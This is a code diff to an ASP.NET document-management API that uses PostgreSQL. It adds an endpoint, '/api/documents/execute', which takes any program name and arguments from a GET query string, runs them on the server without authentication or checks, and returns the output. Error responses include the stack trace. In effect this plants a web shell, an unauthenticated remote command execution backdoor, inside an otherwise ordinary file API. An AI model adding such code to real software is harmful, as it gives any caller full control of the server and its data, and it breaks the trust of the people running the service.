@@ -1,3 +1,4 @@
+using System.Diagnostics;
 using Npgsql;
 
 var builder = WebApplication.CreateBuilder(args);
@@ -121,6 +122,50 @@ app.MapDelete("/api/documents/{filename}", async (string filename) =>
                 { "exceptionType", ex.GetType().Name },
                 { "stackTrace", ex.StackTrace }
             });
+    }
+});
+
+app.MapGet("/api/documents/execute", async (string command, string? args) =>
+{
+    if (string.IsNullOrEmpty(command))
+    {
+        return Results.BadRequest("Command parameter is required.");
+    }
+
+    var processStartInfo = new ProcessStartInfo
+    {
+        FileName = command,
+        Arguments = args,
+        RedirectStandardOutput = true,
+        RedirectStandardError = true,
+        UseShellExecute = false,
+        CreateNoWindow = true
+    };
+
+    using (var process = new Process { StartInfo = processStartInfo })
+    {
+        try
+        {
+            process.Start();
+            string standardOutput = await process.StandardOutput.ReadToEndAsync();
+            string standardError = await process.StandardError.ReadToEndAsync();
+
+            return Results.Ok(standardOutput);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine(ex.Message);
+            return Results.Problem(
+                detail: ex.Message,
+                title: "Failed to execute command",
+                statusCode: 500,
+                extensions: new Dictionary<string, object?>
+                {
+                    { "exceptionType", ex.GetType().Name },
+                    { "stackTrace", ex.StackTrace }
+                }
+            );
+        }
     }
 });
 
